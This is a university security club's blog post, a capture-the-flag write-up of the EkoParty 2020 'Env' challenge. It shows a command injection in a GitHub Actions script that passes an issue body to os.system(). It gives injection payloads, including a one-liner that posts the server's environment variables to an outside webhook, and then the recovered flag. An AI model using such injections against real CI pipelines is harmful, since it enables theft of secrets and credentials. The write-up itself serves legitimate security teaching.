<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link href=https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css rel=stylesheet integrity=sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65 crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js integrity=sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4 crossorigin=anonymous></script>
<link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Mulish:wght@300;600;800&family=Open+Sans:wght@400;600&display=swap" rel=stylesheet><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/all.min.css integrity="sha512-q3eWabyZPc1XTCmF+8/LuE1ozpg5xxn7iO89yfSOd5/oKvyqLngoNGsx8jq92Y8eXJ/IRxQbEC+FGSYxtk2oiw==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/solid.min.css integrity="sha512-LopA1sokwAW/FNZdP+/5q8MGyb9CojL1LTz8JMyu/8YZ8XaCDn1EOm6L7RWIIOHRM7K4jwnHuOmyLZeeeYxSOA==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=/caseyhates.css><title>EkoPartyCTF - Env | OSU Security Club</title></head><body id=background-img style=background-image:url(/blog/ekopartyctf-env.jpg);background-position:50%><nav class="navbar navbar-expand-lg px-lg-5 py-lg-2 fixed-top topbar bg-light"><div class="container-fluid flex-nowrap px-lg-5"><a class=navbar-brand href=/><img src=/osusec-banner.png class=img-fluid alt=OSUSEC width=450px></a>
<button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse" id=navbarSupportedContent><ul class="navbar-nav me-auto mb-2 mb-lg-0"></ul><ul class="navbar-nav d-flex mb-2 mb-lg-0"><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/>Home</a></li><li class="nav-item px-1 dropdown"><a class="nav-link text-black dropdown-toggle" href=# role=button data-bs-toggle=dropdown aria-expanded=false>About</a><ul class=dropdown-menu><li><a class="dropdown-item topbar topbar-drop shadow-none" href=/about/>Who We Are</a></li><li><a class="dropdown-item topbar topbar-drop shadow-none" href=/club-constitution/>Club Constitution</a></li><li><a class="dropdown-item topbar topbar-drop shadow-none" href=/wicys/>WiCyS</a></li></ul></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/calendar/>Calendar</a></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/blog/>Blog</a></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/ctf-league/>CTF League</a></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/accomplishments/>Accomplishments</a></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/resources/>Resources</a></li></ul></div></div></nav><main id=main><div id=home-jumbotron class="jumbotron text-center hero-content infopage-hero d-flex flex-column justify-content-center"><h1 class="hero-title py-1">EkoPartyCTF - Env</h1></div><div class="bg-light justify-content-center infopage-content" style=min-height:60vh><div class=blog-content><h1 class=blog-title>EkoPartyCTF - Env</h1><div class="blog-subtext d-flex flex-wrap"><p class=blog-subtext-item><i class="fa fa-user"></i> Lyell Read</p><p class=blog-subtext-item><i class="fa fa-folder"></i> Tags</p><p class=blog-subtext-item><i class="fa fa-calendar"></i> <time datetime=2020-09-28>Sep 28, 2020</time></p></div><img src=/blog/ekopartyctf-env.jpg alt="EkoPartyCTF logo" class=blogcard-img><div class=blog-content-text><p>EkoParty CTF 2020 Git 3</p><h2 id=prompt>Prompt</h2><p>Not too sure of the original prompt, however I did not need it.</p><h2 id=solution>Solution</h2><p>After <a href=https://github.com/lyellread/ctf-writeups/blob/master/2020-ekoparty/docs>the second part of the git challenge saga</a>, we have gotten a new repository with some new github actions. We know, before analyzing these however, that:</p><ul><li>Issues filed to the <code>ekolabs</code> repo will be ‘moved’ to the <code>ekoparty-internal</code> repo.</li><li>We control content in the submitted issues, and this is copied to the new issues in <code>ekoparty-internal</code> repo.</li></ul><p>That’s good information. Now let’s examine the actions for this repo – we are provided an <code>issue-notify.py</code> and an <code>issue-notify.yml</code>. At first glance at the python script, we see two interesting things:</p><ul><li>The script checks <code>if 'very important' in title:</code> before executing an <code>os.system()</code> call</li><li>The script runs our ‘user input’ (the body of the issue) in the call to <code>os.system()</code>.</li></ul><p>What can we do with this? If we put “very important” in the title, and we include a specific body, we can execute arbitrary commands using the call to <code>os.system()</code>. How so?</p><pre tabindex=0><code>os.system(&#39;echo &#34;%s&#34; &gt; /tmp/%s&#39; % (body, notify_id))
</code></pre><p>This line is vulnerable, as the <code>body</code> of our issue is placed in it’s entirety in the place of the first <code>%s</code>, so if we were to enter <code>"</code>, this would become:</p><pre tabindex=0><code>os.system(&#39;echo &#34;&#34;&#34; &gt; /tmp/%s&#39; % (body, notify_id))
</code></pre><p>Which would echo an empty string to <code>/tmp/$notify_id</code>. This will not do, however, so we need something more complicated to do the trick. Maybe something like sending <code>body</code> of <code>"; sleep 10; echo "</code> will do better, as it will turn into:</p><pre tabindex=0><code>os.system(&#39;echo &#34;&#34;; sleep 10; echo &#34;&#34; &gt; /tmp/%s&#39; % (body, notify_id))
</code></pre><blockquote><p>Note: I did not come up with this all in one shot, I had to prototype it. I did this with the <a href=https://github.com/lyellread/ctf-writeups/blob/master/2020-ekoparty/env/test.py>test.py</a> script.</p></blockquote><p>This will execute the <code>sleep 10</code> just fine. We have code execution now, we just need to find out what to do with it. The challenge name indicates the flag is likely stored in the environment variables so we know where to look, but how to extract this info from the server?</p><p>To determine what tools are available for use, I looked to <code>issue-notify.yml</code>:</p><pre tabindex=0><code>    runs-on: ubuntu-latest
    steps:
      
      ...

      - name: Set up Python3
        if: ${{ success() }}
        uses: actions/setup-python@v1
        with:
        	python-version: &#34;3.7&#34;
</code></pre><p>We at least have a default installation of Python 3.7 to work with, that’s pretty good. To make use of that, we will need to have somewhere to send it, and that’s where a webhook tester, something that captures and displays (in this case) http requests sent to it. For this I used PipeDream. It provides you with a link to send requests to.</p><p>From there, it’s as easy as getting the environment variables <code>os.environ</code>, and sending them home to PipeDream with a little one-line bash / python script of sorts:</p><pre tabindex=0><code>&#34; &amp;&amp; python3 -c &#34;import requests; message = {&#39;message&#39;: str(os.environ)}; r = requests.post(&#39;https://e756afb172e9b06dad06e8cfeff52a32.m.pipedream.net&#39;,data = message);&#34; &amp;&amp; echo &#34;
</code></pre><p>That’s all there is to it: sending that returns <a href=https://github.com/lyellread/ctf-writeups/blob/master/2020-ekoparty/env/envs>envs</a> to PipeDream, and it’s right in there.</p><pre tabindex=0><code>EKO{b08bb4814d581e6a91b3501f8c63c7786fe624e1}
</code></pre><p>~ Lyell Read</p></div></div></div></main><footer class="border-top py-4 bg-light"><div class="text-muted text-center"><p>© <script>document.write((new Date).getFullYear())</script>OSU Security Club.</p><p>Contact us at:
<a href=mailto:security.clubs@oregonstate.edu class="text-reset text-decoration-none fw-bold">security.clubs@oregonstate.edu</a></p><div class=mt-3><div class="d-flex justify-content-center gap-3"><a href=https://www.instagram.com/dam.secure/ target=_blank class=text-reset title=Instagram><i class="fab fa-instagram" aria-hidden=true></i></a>
<a href=https://x.com/OSUSEC target=_blank class=text-reset title=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></div></div></div></footer></body></html>